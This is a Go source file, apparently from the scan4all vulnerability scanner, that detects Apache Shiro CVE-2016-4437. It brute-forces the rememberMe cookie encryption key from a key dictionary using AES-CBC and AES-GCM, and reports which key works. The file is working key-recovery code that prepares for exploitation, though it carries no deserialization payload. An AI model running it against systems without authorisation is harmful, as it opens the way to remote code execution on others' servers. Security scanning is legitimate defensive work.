package shiro

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"encoding/base64"
	"fmt"
	uuid "github.com/satori/go.uuid"
	"github.com/hktalent/scan4all/pkg"
	"io"
	"log"
	"regexp"
	"strings"
)

//go:embed dicts/keys.txt
var keys1 string

func init() {
	if "" != keys1 {
		keys1 = strings.TrimSpace(keys1)
		keys = strings.Split(keys1, "\n")
	} else {
		log.Println("Warning, unable to load into dicts/keys.txt")
	}
}

var (
	keys          = []string{}
	checkContentx = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
)

func padding(plainText []byte, blockSize int) []byte {
	n := blockSize - len(plainText)%blockSize
	temp := bytes.Repeat([]byte{byte(n)}, n)
	plainText = append(plainText, temp...)
	return plainText
}

func aES_CBC_Encrypt(key []byte, Content []byte) string {
	block, _ := aes.NewCipher(key)
	Content = padding(Content, block.BlockSize())
	iv := uuid.NewV4().Bytes()
	blockMode := cipher.NewCBCEncrypter(block, iv)
	cipherText := make([]byte, len(Content))
	blockMode.CryptBlocks(cipherText, Content)
	return base64.StdEncoding.EncodeToString(append(iv[:], cipherText[:]...))
}

func aES_GCM_Encrypt(key []byte, Content []byte) string {
	block, _ := aes.NewCipher(key)
	nonce := make([]byte, 16)
	io.ReadFull(rand.Reader, nonce)
	aesgcm, _ := cipher.NewGCMWithNonceSize(block, 16)
	ciphertext := aesgcm.Seal(nil, nonce, Content, nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ciphertext...))
}

func getkeylen(u string, indexlen int, rememberMe string) (int, error) {
	var header = make(map[string]string, 1)
	header["Cookie"] = "rememberMe=" + rememberMe
	if req, err := pkg.HttpRequset(u, "GET", "", false, header); err == nil {
		var SetCookieAll string
		for i := range req.Header["Set-Cookie"] {
			SetCookieAll += req.Header["Set-Cookie"][i]
		}
		if req.Header != nil {
			counts := regexp.MustCompile("rememberMe=deleteMe").FindAllStringIndex(SetCookieAll, -1)
			return len(counts), nil
		}
	} else {
		return indexlen, err
	}
	return indexlen, nil
}

func CVE_2016_4437(u string) (key string) {
	if indexlen, err := getkeylen(u, 0, "1"); err == nil {
		Content, _ := base64.StdEncoding.DecodeString(checkContentx)
		for _, key := range keys {
			decodekey, _ := base64.StdEncoding.DecodeString(key)
			RememberMe1 := aES_CBC_Encrypt(decodekey, Content) //AES CBC加密
			RememberMe2 := aES_GCM_Encrypt(decodekey, Content) //AES GCM加密
			if CBClen, err := getkeylen(u, indexlen, RememberMe1); err == nil {
				if CBClen != indexlen {
					pkg.GoPocLog(fmt.Sprintf("Found vuln Shiro CVE_2016_4437| URL: %s CBC-KEY: %s\n", u, key))
					return key
				}
			}
			if GCMlen, err := getkeylen(u, indexlen, RememberMe2); err == nil {
				if GCMlen != indexlen {
					pkg.GoPocLog(fmt.Sprintf("Found vuln Shiro CVE_2016_4437| URL: %s GCM-KEY: %s\n", u, key))
					return key
				}
			}
		}
	}
	return ""
}
